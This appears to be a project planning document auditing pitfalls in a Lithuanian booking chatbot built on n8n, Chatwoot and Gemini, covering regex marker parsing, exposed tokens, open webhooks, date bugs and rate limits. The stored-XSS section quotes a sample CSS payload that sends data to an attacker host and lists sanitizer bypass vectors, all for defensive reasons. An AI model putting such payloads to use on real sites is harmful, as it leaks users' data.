# Domain Pitfalls

**Project:** Batutynas.lt Chatbot
**Domain:** Multi-channel booking chatbot (n8n + Chatwoot + Gemini 2.5 Flash + Pinecone + vanilla JS widget)
**Researched:** 2026-03-05
**Cycle context:** Brownfield — 2 test-fix cycles complete, 104+ issues found and resolved

---

## Critical Pitfalls

Mistakes that cause silent booking failures, data loss, or security breaches.

---

### Pitfall 1: BOOKING_CONFIRM Regex Fails on Deeply Nested JSON

**Severity:** CRITICAL

**What goes wrong:** The marker-extraction regex in both enrichers uses a single-level nested brace lookahead:
```
/\[BOOKING_CONFIRM:(\{[^}]*(?:\{[^}]*\}[^}]*)*\})\]/g
```
This handles only one level of nesting. If Gemini generates field values that themselves contain `{` or `}` characters — such as formatted addresses like `{city: "Tauragė", street: "..."}` or free-text notes containing curly braces — the regex silently fails to match. No error is raised. The BOOKING_CONFIRM card is not rendered. The booking notification email is still sent (fired by `booking_notify` before the marker), but the user sees no confirmation, and the admin email is the only record.

**Why it happens:** Regex is the wrong tool for parsing JSON embedded in bracket markers. The current workaround (single nesting level) works for flat JSON but breaks under LLM creativity. Gemini is not formally constrained to flat JSON output — it is only instructed by the system prompt.

**Consequences:**
- Customer sees no confirmation card — believes booking failed
- Double submissions from confused customers
- No systematic detection — silent failure in production
- Already found in Cycle 2 but only partially addressed

**Prevention:**
- Switch from regex to a sentinel-delimiter approach: have the LLM output `[BOOKING_CONFIRM_START]...JSON...[BOOKING_CONFIRM_END]` and parse between fixed tokens
- OR add a post-processing step that normalizes the LLM output before regex matching: flatten curly braces in non-JSON positions
- Add a regex-match failure log: if `[BOOKING_CONFIRM` appears in the response but no match was found, emit a warning to n8n execution log

**Detection:** Add a check after regex replacement: if `enriched.includes('[BOOKING_CONFIRM:')` is still true post-replacement, the match failed — log it and show fallback confirmation text.

**Files:** `n8n-workflows/enrich-response-code.js` line 371, `chatwoot/enrich-chatwoot.js` line 632

---

### Pitfall 2: Chatwoot API Token Exposed in Git History

**Severity:** CRITICAL

**What goes wrong:** The Chatwoot agent bot access token was committed to git history. Even if the file has been updated since, the token remains readable in all prior commits. Anyone with read access to the repository (public or private leak) can extract the token and use it to read all Chatwoot conversations, send messages to any conversation, and delete messages.

**Why it happens:** Secrets were hardcoded in JavaScript files instead of stored in n8n's encrypted credential store or environment variables.

**Consequences:**
- Complete access to all customer conversation data
- Ability to impersonate the bot and send fraudulent messages to customers
- GDPR exposure: Lithuanian customers' personal data (names, phone numbers, addresses) accessible

**Prevention (immediate action required):**
1. Revoke the exposed token in Chatwoot: Super Admin → Agent Bots → rotate/regenerate access token
2. Purge git history using `git filter-repo` or BFG Repo Cleaner to remove the token from all commits
3. Force-push the cleaned history (coordinate with all collaborators to re-clone)
4. Move all credentials to n8n workflow variables (n8n Settings → Variables)
5. Audit `.github/workflows/pages.yml` — GitHub Pages publishes the entire repo root, including any secrets if ever committed in a visible file

**Detection:** `git log --all -S "API_TOKEN_VALUE" --source` will confirm if the secret appears in history.

**Files:** `chatwoot/enrich-chatwoot.js` line 15 (base URL), n8n Send to Chatwoot node (API token field)

---

### Pitfall 3: Open n8n Webhook Accepts Any POST Request — No Auth, No Rate Limiting

**Severity:** CRITICAL

**What goes wrong:** The chat webhook at `/webhook/batutynas-chat` accepts any POST request with no bearer token, HMAC signature, or IP restriction. Any actor who discovers the URL can:
- Submit unlimited messages that trigger Gemini AI completions (direct API cost)
- Trigger `booking_notify` sub-workflow which sends emails to the admin
- Flood the admin inbox with fake bookings
- Exhaust Gemini API quota causing real users to get errors

The widget's UI-only `state.sending` guard is bypassed by calling the webhook directly.

**Why it happens:** n8n webhooks are open by default. Authentication was deferred during initial development.

**Consequences:**
- AI cost runaway (Gemini charges per token)
- Admin email spam/flood from fake bookings
- Legitimate users get rate-limit errors while the abuse is consuming quota
- Discovered by web crawlers or scraping bots within weeks of going live

**Prevention:**
- Add a static bearer token check as the first Code node in `chat-main-v2.json`: validate `Authorization: Bearer <token>` header, return 401 if missing
- OR use n8n's built-in Webhook node authentication options (Basic Auth or Header Auth)
- Add per-session rate limiting in the extract node: track message count per session_id in n8n static data and reject bursts
- Use a Cloudflare Worker or reverse proxy to rate-limit by IP before requests reach n8n

**Detection:** Monitor n8n execution count. A sudden spike in executions without corresponding widget activity indicates abuse.

**Files:** `n8n-workflows/chat-main-v2.json`, `n8n-workflows/fb-messenger-main.json`

---

### Pitfall 4: Silent Booking Failure When booking_notify Succeeds but BOOKING_CONFIRM Fails

**Severity:** CRITICAL

**What goes wrong:** `booking_notify` (SMTP sub-workflow) fires and sends the admin email before the `[BOOKING_CONFIRM]` marker is rendered by the enricher. If the enricher fails (bad JSON, code error, n8n node timeout), the admin gets the email but the customer sees an error or retry button — with no confirmation. The customer tries again, submitting a duplicate booking.

**Why it happens:** The two-step design (tool call first, marker render second) has no transactional integrity. There is no two-phase commit or compensation mechanism.

**Consequences:**
- Duplicate booking submissions
- Admin sees two identical emails and is confused
- Customer thinks first submission failed and may call in addition

**Prevention:**
- Add a check in the enricher: if `booking_notify` result is success AND `[BOOKING_CONFIRM]` marker is present, render confirmation; if enricher fails, the Format Response node should fall back to a plain text confirmation message rather than an error
- Log every `booking_notify` call to a Postgres node or n8n static data with timestamp + session_id to detect duplicates
- In the system prompt: after `booking_notify`, always output `[BOOKING_CONFIRM]` as the very last element — nothing after it

---

### Pitfall 5: localStorage HTML Persistence + Sanitizer Gap = Stored XSS Risk

**Severity:** CRITICAL

**What goes wrong:** Chat messages containing `{{HTML}}` prefix are persisted to `localStorage` as raw HTML markup. On page reload, this HTML is retrieved and passed through `sanitizeHtml()` before rendering. If there is any gap in the sanitizer (a new HTML feature, a browser parsing edge case, or a CSS expression in the `style` attribute), an attacker who can influence the AI response can inject persistent malicious content that executes on every page load.

The `style` attribute is currently in `ALLOWED_ATTRS` (line 312 of `chat-widget.js`). CSS property values can contain `url()` calls that trigger cross-origin requests, which is a data exfiltration vector even without script execution. Example: `style="background: url('https://attacker.com/steal?data=...')"` leaks information on load.

**Why it happens:** Interactive HTML stored for session persistence requires a sanitizer to be perfect. Any gap is exploitable. Style attributes make the attack surface larger.

**Consequences:**
- CSS-based data exfiltration on every page load for the 24-hour session TTL
- If sanitizer gap exists: script execution, session hijacking, credential theft
- Impact scaled by how many users have active sessions

**Prevention:**
- Remove `style` from `ALLOWED_ATTRS` — replace inline styles with CSS classes
- Replace localStorage HTML storage with structured JSON: store `{ type: 'catalog', guestCount: 10 }` and re-render cards client-side on load
- Add automated sanitizer tests for known bypass vectors: `javascript:`, `data:`, CSS `expression()`, `url()` in style, SVG-based vectors

**Files:** `chat-widget/chat-widget.js` lines 304-352, 544-555, 295-296

---

## Moderate Pitfalls

Mistakes that degrade user experience, cause data inconsistency, or introduce hard-to-debug behavior.

---

### Pitfall 6: Trampoline Catalog Duplicated in Four Files — Data Divergence in Production

**Severity:** HIGH

**What goes wrong:** The `TRAMPOLINES` array is copy-pasted into four files with already-divergent values. Key example: `Džiumandži parkas` has `max: 40` in the widget enricher but `max: 200` in the Chatwoot enricher. A customer asking about guest count via the web widget gets different equipment recommendations than a customer asking via Chatwoot or Messenger.

**Why it happens:** No shared data source. Each file was modified independently. The `shortDesc` vs `detail` schema difference means they cannot even be naively unified without a refactor.

**Consequences:**
- Web widget recommends equipment for up to 40 guests; Chatwoot recommends same equipment for up to 200 guests — inconsistent business logic
- Any product update (new trampoline, capacity change, image URL update) must be made in four places or it drifts immediately
- Business owner may receive inquiries based on incorrect capacity information

**Prevention:**
- Extract a single `data/trampolines.json` file and load it via n8n's Read Binary File node or embed it once per workflow
- If n8n Code nodes cannot import external JSON, maintain a single canonical object that is copy-pasted once per release and explicitly version-tagged with a comment
- Add a CI check (even a simple Node.js script) that compares the `name`, `min`, `max` values across all four files and fails if they diverge

**Files:** All four: `n8n-workflows/enrich-response-code.js`, `n8n-workflows/enrich-response-code-test.js`, `chatwoot/enrich-chatwoot.js`, `chatwoot/enrich-chatwoot-test.js`

---

### Pitfall 7: n8n Window Buffer Memory Lost on Restart — Mid-Booking Context Erasure

**Severity:** HIGH

**What goes wrong:** All conversation context is stored in n8n's in-process `Window Buffer Memory` keyed by `sessionId`. When n8n restarts (deployment, crash, EasyPanel container recycle, memory pressure), all active conversation states are lost. A customer mid-booking (e.g., has selected date, location, guests, and is choosing equipment) suddenly has an AI that has forgotten everything and starts over or gives incoherent responses.

**Why it happens:** Window Buffer Memory is an in-memory data structure with no persistence layer. n8n restarts are common on self-hosted EasyPanel setups, especially during updates or memory pressure events (documented n8n memory leak issues in v1.99.1).

**Consequences:**
- Customer mid-booking loses all entered data
- AI gives confused responses (asks for date again, or skips to BOOKING_CONFIRM with missing fields)
- If AI hallucinates missing fields during a restart-interrupted session, incomplete booking emails are sent to admin
- No way to detect this has happened without explicit session recovery logic

**Prevention:**
- Switch to n8n's Postgres-backed memory node or Redis-backed session store — persists across restarts
- Add a session-recovery check at start of each message: if the AI's first response after a context gap is missing expected fields, detect and restart the flow cleanly
- The widget's `localStorage` state (50-message history) is the only source of truth after restart — consider sending the last few user messages as context when a new n8n session begins

**Files:** `n8n-workflows/chat-main-v2.json` (Window Buffer Memory node), `chatwoot/chatwoot-main.json`

---

### Pitfall 8: LLM Outputs Marker in Wrong Format — Silent Enrichment Failure

**Severity:** HIGH

**What goes wrong:** The entire interactive UI depends on Gemini producing exact marker strings like `[DATE_PICKER]`, `[MENU_GROUP_BIRTHDAY:10]`, and `[BOOKING_CONFIRM:{...}]`. LLMs reliably produce variations:
- Wrapping in backticks: `` `[DATE_PICKER]` ``
- Placing inline: `Pasirinkite datą [DATE_PICKER] žemiau`
- Using different brackets: `{DATE_PICKER}` or `(DATE_PICKER)`
- Adding extra space: `[ DATE_PICKER ]`
- Hallucinating new markers: `[CALENDAR_PICKER]`

None of these match the regexes. The enricher produces plain text output. No error is raised. The user sees a text prompt with no interactive element and has to type their date manually (if they know to).

**Why it happens:** LLMs are probabilistic. System prompt instructions reduce but do not eliminate deviations. This is especially likely after context-window exhaustion (16-message window) where the system prompt influence weakens.

**Consequences:**
- User stuck — cannot proceed through booking flow via intended interaction
- User may type raw text in response to a card that should have appeared, AI must interpret free text instead of structured input
- Already found in Cycle 2 testing — `empty marker leak` was exactly this pattern

**Prevention:**
- Add a post-processing normalization step before the enricher runs: strip backticks, trim spaces from inside `[...]`, normalize bracket variants
- Detect and log malformed markers: if the raw LLM output contains `[DATE` or `[MENU` or `[BOOKING` but the enricher made no replacements, log and fall back to a retry prompt
- Add negative examples in the system prompt (already partially done) and reinforce with "NEVER wrap markers in backticks" on every marker definition

**Files:** `prompts/chat-system-prompt.md`, both enricher files

---

### Pitfall 9: maxOutputTokens 1024 Truncates Long AI Responses

**Severity:** HIGH

**What goes wrong:** The AI agent node has `maxOutputTokens: 1024`. A response containing a full booking summary with multiple equipment recommendations, addon descriptions, and a `[BOOKING_CONFIRM:{...}]` marker can easily exceed 1024 tokens. When truncated, the most likely casualties are: the `[BOOKING_CONFIRM]` marker (at the end of the response, per system prompt instructions), markdown formatting (broken mid-sentence), and closing brackets of the JSON payload.

**Why it happens:** 1024 was set as a conservative default during initial development. The system prompt now generates significantly longer responses.

**Consequences:**
- BOOKING_CONFIRM marker truncated — no booking confirmation card shown
- Admin still receives email (if `booking_notify` ran before truncation) but customer sees no confirmation
- Broken markdown renders as raw `**text` in the widget
- The enricher's fallback for empty responses fires if the entire response is truncated

**Prevention:**
- Increase `maxOutputTokens` to at least 4096 for the main chat workflow — Gemini 2.5 Flash supports up to 8192 output tokens
- Add a truncation detector: if the LLM response doesn't end with a proper sentence terminator (`.`, `!`, `?`, or a closing `]`), flag as likely truncated
- Move `[BOOKING_CONFIRM]` marker to be emitted by the enricher based on a simpler signal (e.g., if `booking_notify` succeeded, generate the card from the tool's returned data) rather than depending on the LLM to output it after a long response

**Files:** `n8n-workflows/chat-main-v2.json` (AI Agent node maxOutputTokens parameter)

---

### Pitfall 10: Date Picker Uses UTC (toISOString) — Wrong Day for Lithuanian Users Late Evening

**Severity:** HIGH

**What goes wrong:** `buildDatePicker()` in `n8n-workflows/enrich-response-code.js` (line 205) uses `d.toISOString().split('T')[0]` to generate ISO date strings. `toISOString()` always returns UTC time. Lithuania is UTC+2 in winter and UTC+3 in summer. After 22:00 or 21:00 respectively, the n8n server's local date is the next calendar day in Lithuania, but the widget shows the previous date.

Example: Lithuanian user opens chat at 23:30 on a Friday. The n8n server generates dates for "next Saturday" but uses UTC midnight, so the first Saturday shown is actually the one 8 days away, not 1 day away.

**Why it happens:** The fix was applied to `enrich-chatwoot.js` (correct local date parts are used there) but was not carried over to the widget enricher. Both files implement the same function independently.

**Consequences:**
- User selects a date that is visually labeled as one day but is stored as the previous day in ISO format
- Admin calls customer about booking and references wrong date
- Double-enricher divergence means Chatwoot users see correct dates, widget users see wrong dates

**Prevention:**
- Apply the same fix already in `enrich-chatwoot.js`: replace `toISOString()` with local date part construction: `d.getFullYear() + '-' + pad2(d.getMonth()+1) + '-' + pad2(d.getDate())`
- Prevent future divergence by extracting `buildDatePicker` into a shared utility

**Files:** `n8n-workflows/enrich-response-code.js` lines 199-215 (compare against `chatwoot/enrich-chatwoot.js` lines 376-382)

---

### Pitfall 11: Chatwoot Sends Duplicate message_created Webhook Events

**Severity:** HIGH

**What goes wrong:** Chatwoot is documented to send the `message_created` webhook event multiple times for the same message, particularly when messages are sent in rapid succession or when Messenger integration is active. The current 5-second deduplication window in the `Filter & Extract` node may not cover all cases, especially if duplicate events arrive more than 5 seconds apart.

**Why it happens:** Chatwoot's webhook delivery system has a known race condition with duplicate event emission, documented in GitHub issues #11901 and #7575.

**Consequences:**
- AI agent invoked twice for the same user message
- Two responses sent to the customer (duplicates appear in Chatwoot conversation)
- Two `booking_notify` calls for the same booking — admin receives duplicate email and processes the booking twice
- Session memory double-writes may corrupt conversation context

**Prevention:**
- Implement a more robust deduplication strategy using message ID: store the last N processed message IDs in n8n static data and skip if already seen (not just a 5-second window)
- Use the `message_id` field from Chatwoot webhook payload as the idempotency key
- Add a Postgres node for persistent deduplication if n8n restarts reset static data

**Files:** `chatwoot/chatwoot-main.json` (Filter & Extract node deduplication logic)

---

### Pitfall 12: Gemini API Rate Limit 429 — No Retry Logic in Production Workflow

**Severity:** HIGH

**What goes wrong:** Gemini 2.5 Flash has rate limits that were reduced by 50-80% in December 2025. The free tier operates at very low RPM. If multiple users send messages concurrently, or if a burst of Chatwoot webhook events fires simultaneously, the Gemini API returns `429 RESOURCE_EXHAUSTED`. n8n's LangChain AI Agent node does not automatically retry on 429. The workflow fails, and the user receives the error fallback message.

**Why it happens:** The current workflow has no retry-on-429 logic. n8n's `Retry On Fail` setting is available but not configured for the AI Agent node.

**Consequences:**
- Users during busy periods (weekend evenings, holiday season) receive error messages instead of chatbot responses
- If this happens mid-booking, the booking is lost and the user abandons
- Error messages accumulate in n8n execution log with no alerting

**Prevention:**
- Enable n8n's `Retry On Fail` on the AI Agent node: 3 retries, 2000ms wait (exponential recommended)
- Add a billing account to Google AI to move off the free tier rate limits
- Implement a fallback branch: if AI returns error, respond with a static message and phone number rather than a raw error
- Monitor Gemini API usage in Google AI Studio console for quota visibility

**Files:** `n8n-workflows/chat-main-v2.json` (AI Agent node settings), `n8n-workflows/fb-messenger-main.json`

---

## Minor Pitfalls

Bugs and UX degradation that erode quality without causing total failures.

---

### Pitfall 13: Progress Bar Step 2 (Location) Never Shows

**What goes wrong:** The progress bar calls are `buildProgressBar(1)` for date, `buildProgressBar(3)` for guest count, and `buildProgressBar(4,4)` for equipment. Step 2 (location) is asked as a text question with no progress bar call, so the bar visually jumps from step 1 to step 3.

**Prevention:** Either add `buildProgressBar(2)` to the location text response, or renumber to a 3-step bar.

**Files:** `n8n-workflows/enrich-response-code.js` lines 327-328

---

### Pitfall 14: Messenger Quick Reply Titles Truncated at 20 Characters

**What goes wrong:** Facebook Messenger enforces a 20-character limit on quick reply titles. Lithuanian words are long (e.g., "Planuoju vaikų gimtadienį" = 24 chars, "Planuoju viešą renginį" = 22 chars). Any title exceeding 20 characters is silently truncated by Facebook, producing awkward mid-word cuts in the Messenger UI.

**Why it happens:** The Chatwoot enricher generates Messenger quick replies from the same label strings as the web widget, without applying a length constraint.

**Prevention:**
- Add a 20-char enforced truncation to the `isMessenger` branch of the Chatwoot enricher
- Maintain a separate short-label map for Messenger: e.g., `"Gimtadienis"`, `"Viešas renginys"`, `"Vakarėlis"`, `"Pirkimas"`, `"DUK"`
- Test every quick reply string against the 20-char limit before shipping Messenger integration

**Files:** `chatwoot/enrich-chatwoot.js` (Messenger quick reply rendering)

---

### Pitfall 15: Conversation Flow Switch Bug — Birthday to Public Event Loses Guest Count

**What goes wrong:** If a user starts a birthday booking flow (selects guest count via `[GUEST_COUNT]`), then switches to a public event (types "actually it's a public event"), the system prompt instructs the agent to restart from step 1. However, the `guestCount` from the birthday flow may persist in the AI's context window and be incorrectly applied to the `[MENU_GROUP_PUBLIC:N]` marker, showing birthday-appropriate equipment for a public event.

**Why it happens:** The 16-message context window carries forward all prior conversation. The AI is instructed to restart but may still reference earlier guest count values.

**Prevention:**
- Add explicit flow-restart phrases to the system prompt: "When starting a new group, forget the previous guest count and ask again from step 1"
- In the system prompt, mark flow switches with a `[MAIN_MENU]` marker first, then wait for a fresh selection before proceeding — this creates a clear break in the context
- Already partially addressed in Cycle 2; verify full reset behavior in Cycle 3

**Files:** `prompts/chat-system-prompt.md`

---

### Pitfall 16: Pinecone RAG Silent Degradation — No Health Check

**What goes wrong:** If the Pinecone index is accidentally cleared, the namespace changes, or the serverless index is paused (Pinecone pauses inactive free-tier indexes after 7 days of inactivity), the chatbot silently falls back to using only the static system prompt knowledge. FAQ questions return stale or missing information. No error is raised — the AI simply has less knowledge.

**Why it happens:** n8n's Pinecone vector store node returns empty results silently if the index is unavailable or the namespace is wrong. There is no health check node in any workflow.

**Consequences:**
- FAQ and product detail questions return approximate answers from training data instead of verified batutynas.lt content
- Business-critical details (current prices, new products, policy changes) may be missing
- No alerting — business owner has no visibility

**Prevention:**
- Add a daily health check n8n workflow: query Pinecone for a known vector, verify the result count is above a threshold (e.g., > 50 vectors), and send an alert email if the check fails
- Set a calendar reminder to query the Pinecone index at least once a week to prevent free-tier pausing

**Files:** `n8n-workflows/chat-main-v2.json` (Pinecone vector store node), `n8n-workflows/ingest-website.json`

---

### Pitfall 17: localStorage Quota Overflow — Session Save Silently Fails

**What goes wrong:** `saveSession()` saves up to 50 messages. Each `{{HTML}}` message can be 3-8 KB (full card HTML with image URLs, equipment data). At 50 messages, the session can reach 150-400 KB, well below the 5 MB localStorage limit individually, but the Zyrosite website may also use localStorage for its own state. If total localStorage usage across all scripts exceeds 5 MB, `saveSession()` throws a `QuotaExceededError` that is silently swallowed (line 79: empty catch block).

**Why it happens:** The catch block was added to handle the unavoidable case but provides no fallback behavior — it discards the save silently.

**Consequences:**
- Session not saved; user refreshes page and loses entire conversation history
- User must restart booking flow from scratch
- No indication to the user that anything went wrong

**Prevention:**
- In the catch block, attempt to save a reduced session (last 10 messages instead of 50)
- Strip `{{HTML}}` content from stored messages: store only user-visible text and a `type` field, re-render cards on load
- Add a console warning (not error) so developers can detect quota issues during testing

**Files:** `chat-widget/chat-widget.js` lines 69-80

---

### Pitfall 18: Facebook Messenger HMAC Signature Verification Disabled

**What goes wrong:** The FB Messenger webhook does not verify the `X-Hub-Signature-256` HMAC signature on incoming POST requests. Any HTTP POST to the webhook URL is processed as a legitimate Facebook message. This is documented with a code comment but the risk is accepted without mitigation.

**Why it happens:** n8n does not expose the raw request body to Code nodes in a way that allows HMAC verification, because the body is already parsed by the time a Code node runs.

**Consequences:**
- An attacker who knows the webhook URL can send fake Messenger messages, triggering AI responses that get sent to real Facebook users via the Graph API
- If the attacker knows a real user's PSID (Page-Scoped ID), they can inject messages into their conversation

**Prevention:**
- Implement a reverse proxy (Cloudflare Worker or nginx) that receives the raw body, verifies the HMAC signature, and forwards only verified requests to n8n
- Alternatively, add IP allowlisting to restrict the webhook to Facebook's published IP ranges
- At minimum, add a verify-token check on POST requests (in addition to the GET verification that already exists)

**Files:** `n8n-workflows/fb-messenger-main.json` (Extract and Route code node)

---

### Pitfall 19: Product Image Dependency on Zyrosite CDN

**What goes wrong:** All 13+ trampoline product images are hardcoded Zyrosite CDN URLs (`assets.zyrosite.com`). These URLs are tied to the batutynas.lt Zyrosite website subscription. If the client migrates hosting away from Zyrosite, downgrades the plan, or if Zyrosite CDN has an outage, all product images break simultaneously.

**Why it happens:** Images were referenced from the Zyrosite website directly rather than hosted on a stable CDN.

**Consequences:**
- All equipment cards render with broken image placeholders (only emoji fallback text remains)
- Major UX degradation — the visual catalog loses all visual hierarchy
- This can happen without any code change — purely an external dependency failure

**Prevention:**
- Re-host all product images on Cloudflare R2, Bunny CDN, or a GitHub repository with raw file serving
- Update the image URLs in the canonical `TRAMPOLINES` array (once it's unified)
- The emoji-only fallback already works as a degradation path, but should be tested explicitly

---

### Pitfall 20: Test Wrappers Go Stale — Production Code Diverges from Test Code

**What goes wrong:** `enrich-response-code-test.js` and `enrich-chatwoot-test.js` are manually-maintained copies of the production enricher logic. When production is updated (marker added, builder function changed), the test wrappers must be manually updated to match. A header comment "Synced with production on 2026-03-04" is the only enforcement mechanism.

**Why it happens:** The n8n Code node format (top-level script reading from `$input`) is not directly importable — a wrapper function is required. No build step bridges the gap.

**Consequences:**
- Tests pass (render correctly) but production fails, or vice versa
- Bugs introduced in production are not caught because test wrapper uses old code
- This is the most likely cause of future "regression after fix" cycles

**Prevention:**
- Add a build script (Node.js, < 20 lines) that reads `enrich-response-code.js` and wraps it in the test function automatically, overwriting `enrich-response-code-test.js` as part of a pre-commit hook or npm script
- Alternatively, restructure the enricher as a CommonJS module function exported from a standalone file, and have both n8n (via a thin wrapper) and the test harness import the same function

**Files:** `n8n-workflows/enrich-response-code-test.js`, `chatwoot/enrich-chatwoot-test.js`

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| Security remediation | Chatwoot token still active in git history after code update | Purge git history with BFG before any public access; force-push requires coordination |
| Token migration to env vars | n8n workflow variables are global — naming collision if multiple workflows share var names | Use namespaced variable names: `CHATWOOT_BASE_URL`, `CHATWOOT_API_TOKEN`, not just `API_TOKEN` |
| maxOutputTokens increase | Increasing to 4096 may cause Gemini to generate longer, more verbose responses — system prompt needs reinforcing to stay concise | Add `Keep responses concise` reminder in system prompt; test all flows at new token limit |
| Catalog data unification | Extracting TRAMPOLINES to shared JSON requires a deployment step in n8n (importing JSON into Code node) | Plan the migration carefully; keep old code as fallback until new data is confirmed live |
| Messenger production activation | Quick reply labels must be pre-tested at exactly 20 chars; do not assume Lithuanian labels pass | Create a Messenger-specific label map before activation; test every quick reply manually |
| Playwright test setup | Playwright is installed but entirely unconfigured — setting up test suite requires significant scaffolding | Start with a single smoke test for the critical path (main menu → birthday → date → BOOKING_CONFIRM) before attempting full coverage |
| n8n restart / EasyPanel memory | n8n v1.99.1+ has documented memory leak with code nodes; EasyPanel container may restart without warning | Pin to a stable n8n version; add daily restart schedule to prevent memory drift |
| Gemini rate limits | Free tier limits were cut 50-80% in December 2025; production traffic can hit 429 on peak days | Enable billing before production launch; configure retry-on-fail on AI Agent node |
| RAG re-ingestion | Re-running `ingest-website.json` with changed URLs will add duplicate vectors if namespace is not cleared first | Always clear the `batutynas-lt` namespace before re-ingesting; verify vector count after |
| Booking double-submit | Users who see no confirmation (enricher failure) will re-submit; admin gets duplicates | Add deduplication by session_id + timestamp in booking_notify sub-workflow before sending email |

---

## Sources

- Codebase analysis: `/Users/dovydasdobrovolskis/Projects/batutynas-chatbot/.planning/codebase/CONCERNS.md` (2026-03-05)
- Codebase analysis: `/Users/dovydasdobrovolskis/Projects/batutynas-chatbot/.planning/codebase/ARCHITECTURE.md` (2026-03-05)
- n8n webhook timeout documentation: [n8n Community — Webhook timeout](https://community.n8n.io/t/webhook-question-is-it-supposed-to-timeout/181066) — MEDIUM confidence
- n8n memory leak: [GitHub n8n issue #16862 — Memory Leak in v1.99.1](https://github.com/n8n-io/n8n/issues/16862) — HIGH confidence (official repo)
- n8n execution queue stuck: [n8n Community — Execution Queue Stuck](https://community.n8n.io/t/execution-queue-stuck/239431) — MEDIUM confidence
- n8n Window Buffer Memory session loss: [n8n Community — Window Buffer Memory lost chat history](https://community.n8n.io/t/window-buffer-memory-for-ai-agent-lost-its-chat-history/72982) — MEDIUM confidence
- Chatwoot duplicate webhook events: [GitHub chatwoot issue #11901](https://github.com/chatwoot/chatwoot/issues/11901) — HIGH confidence (official repo)
- Chatwoot multiple webhook calls: [GitHub chatwoot discussion #7575](https://github.com/orgs/chatwoot/discussions/7575) — HIGH confidence
- Gemini 2.5 Flash hallucination reports: [Google AI Forum — hallucinations in 2.5 series](https://discuss.ai.google.dev/t/report-hallucinations-in-2-5-model-series/83911) — MEDIUM confidence
- Gemini API rate limits December 2025 reduction: [Gemini API Rate Limits Complete Guide](https://www.aifreeapi.com/en/posts/gemini-api-rate-limit) — MEDIUM confidence (third-party, consistent with official docs)
- Gemini 429 in n8n: [n8n Community — Gemini too many requests](https://community.n8n.io/t/the-service-is-receiving-too-many-requests-from-you-agent-ai-llm-gemini/171825) — HIGH confidence
- Gemini language switching bug: [Google AI Forum — Language Issue in gemini-2.5-flash-lite](https://discuss.ai.google.dev/t/language-issue-in-gemini-2-5-flash-lite-preview-09-2025/106482) — HIGH confidence (official forum)
- Facebook Messenger quick reply 20-char limit: [Facebook Messenger quick reply documentation via Rasa](https://rasa.com/docs/reference/channels/facebook-messenger/) — HIGH confidence
- n8n webhook security — open endpoint risks: [Secure n8n Webhooks guide](https://logicworkflow.com/blog/n8n-webhook-security/) — MEDIUM confidence
- Chatwoot stored XSS via chat input: [Chattermate stored XSS advisory GHSA-72p3-w95w-q3j4](https://github.com/chattermate/chattermate.chat/security/advisories/GHSA-72p3-w95w-q3j4) — HIGH confidence (CVE advisory)
- localStorage XSS attack vectors: [PortSwigger Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) — HIGH confidence
- Chatbot dead end patterns: [Cyara — Detecting Dead Ends in Chatbot Conversation Flow](https://cyara.com/blog/detecting-dead-ends-in-the-chatbot-conversation-flow/) — MEDIUM confidence
- n8n rate limiting: [n8n Docs — Handling API rate limits](https://docs.n8n.io/integrations/builtin/rate-limits/) — HIGH confidence (official docs)

---

*Pitfalls audit: 2026-03-05*
